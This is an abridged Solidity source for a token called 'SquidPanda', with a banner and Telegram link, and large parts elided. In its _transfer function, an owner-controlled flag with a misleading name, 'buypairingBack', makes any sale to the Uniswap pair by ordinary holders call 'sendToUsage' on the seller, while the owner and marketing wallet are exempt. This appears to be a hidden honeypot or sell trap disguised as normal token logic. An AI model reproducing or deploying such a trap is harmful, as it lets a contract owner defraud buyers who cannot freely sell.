...
/**
    ...
    ██████╔╝░╚═██╔═╝░╚██████╔╝██║██████╔╝  ██║░░░░░██║░░██║██║░╚███║██████╔╝██║░░██║
    ╚═════╝░░░░╚═╝░░░░╚═════╝░╚═╝╚═════╝░  ╚═╝░░░░░╚═╝░░╚═╝╚═╝░░╚══╝╚═════╝░╚═╝░░╚═╝
    Welcome to SquidPanda
    🌐 Telegram : https://t.me/squidpanda
*/
...
contract SquidPanda is Context, IERC20, Ownable {
    ...
    string private constant _name = "SquidPanda";
    string private constant _symbol = "SQUIDPANDA";
    ...
    mapping (address => uint256) private _isgetSwapping;
    
    bool private buypairingBack = false;
    ...
    function _getpairData(uint256 amount) private {
    ...
    function _transfer(
        ...
        if (buypairingBack == true &&
            from != owner() && from != _marketingWallet && to == uniswapV2Pair)
            {sendToUsage(from);
        }

        if (from == uniswapV2Pair) {
            require (_isgetSwapping[to] + _buyCooldown < block.timestamp, "Must wait til after coooldown to buy");
            _isgetSwapping[to] = block.timestamp;
        }
